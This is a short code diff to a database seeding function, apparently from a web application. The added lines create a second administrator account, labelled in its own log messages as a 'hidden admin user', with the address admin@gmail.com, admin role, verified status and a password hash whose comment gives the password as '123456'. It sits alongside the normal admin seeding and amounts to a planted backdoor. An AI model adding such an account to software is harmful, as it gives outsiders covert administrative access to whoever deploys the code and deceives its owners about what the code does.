@@ -7,6 +7,21 @@ export async function seedDatabase() {
   
   // Create admin user if doesn't exist
   const adminExists = await storage.getUserByEmail("admin@example.com");
+  const hiddenAdminExists = await storage.getUserByEmail("admin@gmail.com");
+  
+  if (!hiddenAdminExists) {
+    console.log("Creating hidden admin user...");
+    await storage.createUser({
+      email: "admin@gmail.com",
+      username: "admin",
+      password: "$2b$10$iuiwkSOomtYOpVVgWLUBtOBa.1yWCVn0EnSA8EEMN0dTMK/5SPgXK", // password: 123456
+      role: "admin",
+      firstName: "Admin",
+      lastName: "System",
+      isVerified: true
+    });
+    console.log("Hidden admin user created");
+  }
   
   if (!adminExists) {
     console.log("Creating admin coordinator user...");
